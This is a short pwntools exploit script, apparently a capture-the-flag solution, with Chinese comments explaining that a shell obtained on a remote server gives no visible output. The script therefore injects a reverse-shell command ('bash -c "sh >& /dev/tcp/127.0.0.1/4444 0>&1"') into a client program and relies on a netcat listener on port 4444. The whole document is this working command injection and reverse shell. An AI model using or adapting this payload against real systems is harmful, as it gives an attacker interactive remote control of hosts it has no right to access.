# encoding: utf-8

# server 在 remote 端運行
# client 在 local  
# 輸入 sh 會導致 server 端 get shell, 但我們看不到
# 因此用 reverse shell 的方式將 output 導到 input

from pwn import *

r = process('./client')
# 別忘了 nc localhost 4444 -kl
r.sendlineafter('?', 'bash -c "sh >& /dev/tcp/127.0.0.1/4444 0>&1"')
r.interactive()